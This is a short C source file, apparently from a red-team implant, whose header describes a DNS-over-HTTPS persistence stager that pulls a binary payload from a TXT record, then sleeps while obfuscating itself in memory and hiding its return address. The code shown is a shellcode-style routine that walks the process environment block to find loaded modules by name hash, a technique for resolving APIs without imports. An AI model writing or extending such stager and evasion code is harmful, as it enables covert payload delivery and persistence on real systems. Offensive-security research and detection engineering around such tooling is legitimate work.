/*-
 *
 * dns over http(s) persistence stager.
 * grabs a binary payload over a txt
 * record before going back to sleep
 * for a specified time.
 *
 * before going to sleep, it will try
 * to obfuscate itself in memory and
 * hide its return address.
 *
 * Copyright (c) 2021 Austin Hudson
 * Copyright (c) 2021 GuidePoint Security LLC
 *
-*/

#include "common.h"

D_SEC(B) PVOID PebGetModule( IN ULONG Hsh )
{
	PPEB                  peb;
	PPEB_LDR_DATA         ldr;
	PLDR_DATA_TABLE_ENTRY dte;
	PLIST_ENTRY           ent;
	PLIST_ENTRY           hdr;
	ULONG                 mod;

	peb = NtCurrentTeb()->ProcessEnvironmentBlock;
	ldr = peb->Ldr;
	hdr = & ldr->InLoadOrderModuleList;
	ent = hdr->Flink;

	for ( ; hdr != ent ; ent = ent->Flink ) {
		dte = C_PTR( ent );
		mod = HashString( dte->BaseDllName.Buffer, dte->BaseDllName.Length );

		if ( mod == Hsh ) {
			return C_PTR( dte->DllBase );
		};
	};
	return NULL;
}; 
